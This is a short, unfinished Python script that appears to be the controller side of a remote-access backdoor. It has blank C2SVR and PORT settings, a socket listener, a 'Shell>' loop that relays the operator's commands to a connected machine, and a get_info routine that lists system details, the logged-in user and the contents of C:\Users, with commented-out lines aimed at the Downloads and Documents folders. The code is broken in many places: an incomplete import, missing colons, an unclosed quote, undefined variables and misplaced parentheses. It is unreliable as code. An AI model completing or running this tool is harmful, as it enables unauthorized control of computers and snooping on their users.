import socket
import os
import platform
import 

C2SVR=
PORT=


def get_info():
	sys = platform.uname()
	cusr = os.getlogin()
	allusr = os.listdir("C:\Users")
	#cDownloads =os.listdir("C:\Users\"+os.getlogin()+"\Downloads\")
	#cDocuments = 
def shell()
	command = input("Shell> ")
	if 'terminate in command:
		conn.send('terminate')
		break
	else:
		conn.send(command.encode())
		print(conn.recv(1024.decode()))
			
def socket():
	s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.bind(C2SVR, PORT)
	s.listen(1)
	conn ,addr = s.accept()
	print("connection from", addr)
	while True:
		input("shell or get_info")
		if args == "shell"
			shell()
		elif args == "get_info"
			get_info()
		else:
			print("incorrect options")
			exit()


